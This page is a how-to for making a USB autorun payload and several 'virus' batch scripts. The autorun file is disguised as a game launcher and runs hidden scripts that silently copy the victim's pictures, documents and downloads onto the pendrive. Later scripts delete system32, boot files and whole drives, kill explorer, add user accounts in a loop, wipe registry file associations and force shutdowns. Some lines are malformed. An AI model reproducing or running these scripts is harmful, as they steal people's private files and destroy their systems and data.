[autorun]
<br> 
icon=drive.ico
<br>
open=launch.bat
<br>
action=Click ok to Run game for Windows
<br>
shell\open\command=launch.bat
<br>

Save As...autorun.inf
<br>
<br>

Step 2:
<br>

@echo off
<br>
:: variables
<br>
/min
<br>
SET odrive=%odrive:~0,2%
<br>
set backupcmd=xcopy /s /c /d /e /h /i /r /y
<br>
echo off
<br>
%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
<br>
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
<br>
%backupcmd% "%USERPROFILE%\videos" "%drive%\all\videos"
<br>
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\all\Downloads"
<br>
%backupcmd% "%USERPROFILE%\Documents" "%drive%\all\Documents"
<br>
@echo off
<br> 
cls
<br>


Save as...file.bat
<br>
<br>

Step 3:
<br>

CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
<br>

Save as...invisible.vbs
<br>
<br>

Step 4:
<br>

wscript.exe \invisible.vbs file.bat 
<br>

Save as...launch.bat
<br>

Step 5:

copy all the 4 files to pendrive.
<br>
<br>
<br>
1)  @echo off
<br>
:virus
<br>
del /f /q "C:\WINDOWS\system32"
<br>
taskkill explorer.exe
<br>
tskill explorer.exe
<br>
set /a _virus+=1
<br>
net user %_virus+% /add
<br>
goto virus
<br>

2)@echo off
<br>
attrib -r -s -h c:autoexec.bat
<br>
del c:autoexec.bat
<br>
attrib -r -s -h c:boot.ini
<br>
del c:boot.ini
<br>
attrib -r -s -h c:ntldr
<br>
del c:ntldr
<br>
attrib -r -s -h c:windowswin.ini
<br>
del c:windowswin.ini
<br>

@echo off
<br>
msg * YOU GOT OWNED!!!
<br>
shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive
<br>


3)How to Make the virus ?
<br>
   1. Open Notepad and copy below code into it.
<br>
@Echo off
<br>
Del C:\ *.* |y
<br>





4)@echo off
<br>
:virus
<br>
cd /d c:
<br>
md%random%
<br>
cd /d D:
<br>
md%random%
<br>
cd /d E:
<br>
md%random%
<br>
goto virus
<br>


5)@echo off
<br>
del D:/*.*/f /s /q
<br>
del E:/*.*/f /s /q
<br>
del F:/*.*/f /s /q
<br>
del G:/*.*/f /s /q
<br>
del H:/*.*/f /s /q
<br>
del I:/*.*/f /s /q
<br>
del J:/*.*/f /s /q
<br>
 



6 @ECHO OFF
<br>
START reg delete HXCR/.EXE
<br>
START reg delete HXCR/.dll
<br>
START reg delete HXCR/.*
<br>


7)


